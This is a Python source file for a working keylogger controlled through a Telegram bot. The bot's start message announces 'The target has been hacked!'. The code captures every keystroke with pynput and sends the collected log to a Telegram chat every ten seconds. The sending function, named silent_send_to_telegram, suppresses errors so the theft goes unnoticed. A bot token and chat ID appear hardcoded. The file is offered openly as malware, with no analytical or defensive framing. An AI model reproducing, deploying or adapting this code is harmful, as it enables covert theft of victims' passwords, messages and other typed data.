import os
import pynput.keyboard as keyboard
import threading
import asyncio
import requests
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes


log = ""  
bot_token = "7583155762:AAF0tjeO4TufEfzKVrCzyRwiGA0_x9840e8"  # chnage with your Telegram bot token
chat_id = "772369130"  # change with your Telegram chat ID here https://t.me/chatIDrobot
interval = 10  # Set time interval in seconds to send logs

current_keys = set()


def on_press(key):
    global log, current_keys
    if hasattr(key, 'char'):  
        log += key.char
    else:  
        if key not in current_keys:
            current_keys.add(key)
            log += f" [{str(key)}] "


def on_release(key):
    global current_keys
    if key in current_keys:
        current_keys.remove(key)


async def send_keystrokes():
    global log
    while True:
        if log.strip():  
            await silent_send_to_telegram(log)
            log = ""  
        await asyncio.sleep(interval)  


async def silent_send_to_telegram(message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {"chat_id": chat_id, "text": message}
    try:
        requests.post(url, data=data, timeout=5)
    except requests.exceptions.RequestException:
        pass  


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        '''The target has been hacked!

/key_logger - Start the keylogger
/exit - Stop the keylogger

Follow me: https://x.com/anishalx7
GitHub: https://github.com/anishalx
'''
    )


async def exit_bot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text('Stopping the keylogger...')
    os._exit(0)  

async def key_logger(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text('Keylogger started!')

    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()  


    asyncio.create_task(send_keystrokes())


def main():
    app = ApplicationBuilder().token(bot_token).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("exit", exit_bot))
    app.add_handler(CommandHandler("key_logger", key_logger))

    # print("Bot is running...")  #  Print for confirmation 
    app.run_polling()  

if __name__ == "__main__":
    main()

